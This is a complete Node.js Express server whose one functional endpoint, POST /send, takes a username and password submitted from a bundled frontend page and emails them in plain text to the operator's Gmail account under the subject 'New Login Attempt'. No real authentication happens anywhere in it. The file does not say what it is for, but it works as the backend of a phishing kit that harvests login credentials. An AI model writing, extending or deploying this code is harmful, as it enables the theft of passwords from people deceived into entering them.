require("dotenv").config();
const path = require("path");
const express = require("express");
const nodemailer = require("nodemailer");

const app = express();
app.use(express.json());

// Serve the static frontend folder
app.use(express.static(path.join(__dirname, "..", "frontend")));

// Email endpoint
app.post("/send", async (req, res) => {
  const { username, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER,
    subject: "New Login Attempt",
    text: `Username: ${username}\nPassword: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: "Email sent!" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to send email" });
  }
});

// Fallback to index.html for the root route
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "..", "frontend", "index.html"));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
